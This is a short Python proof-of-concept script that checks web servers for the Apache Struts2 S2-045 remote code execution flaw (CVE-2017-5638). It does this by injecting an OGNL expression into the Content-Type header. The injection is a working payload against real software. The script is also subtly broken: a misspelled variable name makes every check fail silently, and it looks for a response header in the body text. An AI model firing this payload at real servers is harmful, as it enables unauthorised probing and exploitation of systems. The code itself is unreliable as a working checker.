#!/usr/bin/env python
#-*- coding:utf-8 -*-
# author = S4kur4
_type = 'RCE'
"""
Struts2 S2-045 Remote Code Execution PoC (CVE-2017-5638)

Version:
2.3.5-2.3.31, 2.5-2.5.10
"""

import requests
import random

header = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        header["Content-Type"] = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vul','vul')}.multipart/form-data"
        rsponse = requests.get(url, headers=header, timeout=5)
        if "vul:vul" in reponse.text:
            return True
        else:
            return False
    except Exception:
        return False

